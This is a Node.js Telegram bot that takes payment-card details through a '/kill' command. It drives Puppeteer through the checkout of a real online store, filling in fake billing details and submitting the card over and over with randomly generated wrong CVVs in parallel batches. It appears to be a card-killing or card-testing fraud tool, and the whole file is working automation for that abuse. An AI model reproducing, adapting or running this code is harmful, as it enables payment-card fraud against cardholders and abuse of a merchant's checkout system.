const puppeteer = require("puppeteer");
const TelegramBot = require("node-telegram-bot-api");
const { token } = require("./config");

const bot = new TelegramBot(token, { polling: true });

const runFunction = async (ccNum, ccExp, ccCvv, ccName, chatId) => {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  try {
    await page.goto("https://alanwatts.com/");

    await page.waitForSelector(
      '.custom__item-inner .btn[href="https://store.alanwatts.org/cart/add?id=33575236046&quantity=1"]'
    );
    await page.click(
      '.custom__item-inner .btn[href="https://store.alanwatts.org/cart/add?id=33575236046&quantity=1"]'
    );

    await page.waitForSelector(
      'input.btn--small-wide[name="checkout"][value="Check out"]'
    );
    await page.click(
      'input.btn--small-wide[name="checkout"][value="Check out"]'
    );

    await page.waitForSelector("input#email");
    await page.type("input#email", "checkemail@gmail.com");

    await page.waitForSelector("input#TextField0");
    await page.type("input#TextField0", "John");

    await page.waitForSelector("input#TextField1");
    await page.type("input#TextField1", "Doe");

    await page.waitForSelector("input#billing-address1");
    await page.type("input#billing-address1", "6103 New");

    await page.waitForSelector("input#TextField3");
    await page.type("input#TextField3", "Cleveland");

    await page.waitForSelector("#Select1");
    await page.select("#Select1", "AL");

    await page.waitForSelector("input#TextField4");
    await page.type("input#TextField4", "35049");

    const fillCreditCardField = async (frameSelector, inputSelector, value) => {
      await page.waitForSelector(frameSelector);
      const frameElement = await page.$(frameSelector);
      const frame = await frameElement.contentFrame();
      await frame.waitForSelector(inputSelector);
      await frame.type(inputSelector, value);
    };

    try {
      // CC Number
      await fillCreditCardField(
        'iframe[id^="card-fields-number"]',
        'input[name="number"]',
        ccNum
      );

      // CC Expiry
      await fillCreditCardField(
        'iframe[id^="card-fields-expiry"]',
        'input[name="expiry"]',
        ccExp
      );

      // CC Cvv
      await fillCreditCardField(
        'iframe[id^="card-fields-verification_value"]',
        'input[name="verification_value"]',
        ccCvv
      );

      // CC Name
      await fillCreditCardField(
        'iframe[id^="card-fields-name"]',
        'input[name="name"]',
        ccName
      );

      await page.waitForSelector("#checkout-pay-button");
      await page.click("#checkout-pay-button");

      await page.waitForTimeout(10000);
    } catch (error) {
      console.log("Error filling credit card information: ", error);
    }
  } catch (error) {
    console.log("Error during checkout process: ", error);
  }
};

const runChecker = async (ccNum, ccExp, ccCvv, ccName, chatId) => {
  const runMultipleInstances = async () => {
    const instances = [];
    for (let i = 0; i < 2; i++) {
      let randomCvv = Math.round(Math.random() * 999)
        .toString()
        .padStart(3, "0");
      if (randomCvv === ccCvv) {
        randomCvv = Math.round(Math.random() * 999)
          .toString()
          .padStart(3, "0");
      }
      instances.push(runFunction(ccNum, ccExp, randomCvv, ccName, chatId));
    }
    await Promise.all(instances);
  };

  runMultipleInstances();

  let count = 0;
  const maxCount = 4;
  const intervalTime = 20000;

  const intervalId = setInterval(() => {
    if (count < maxCount) {
      runMultipleInstances();
      count++;
    } else {
      clearInterval(intervalId);
    }
  }, intervalTime);
};

bot.onText(/\/kill (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const params = match[1].split(",").map((param) => param.trim());

  if (params.length !== 4) {
    return bot.sendMessage(
      chatId,
      "Invalid format. Please use: /run ccNum, ccExp, ccCvv, ccName"
    );
  }

  const [ccNum, ccExp, ccCvv, ccName] = params;

  // Basic validation
  if (!/^\d{13,19}$/.test(ccNum)) {
    return bot.sendMessage(chatId, "Invalid credit card number.");
  }
  if (!/^\d{2}\/\d{2}$/.test(ccExp)) {
    return bot.sendMessage(
      chatId,
      "Invalid expiration date. Use MM/YY format."
    );
  }
  if (!/^\d{3,4}$/.test(ccCvv)) {
    return bot.sendMessage(chatId, "Invalid CVV.");
  }
  if (ccName.length < 2) {
    return bot.sendMessage(chatId, "Invalid name.");
  }

  bot.sendMessage(chatId, "Process Started");
  runChecker(ccNum, ccExp, ccCvv, ccName, chatId);
});

bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, "Stopping the bot...");
  process.exit();
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(
    chatId,
    "Send /kill ccNum, ccExp, ccCvv, ccName to start the process, or /stop to stop the bot."
  );
});
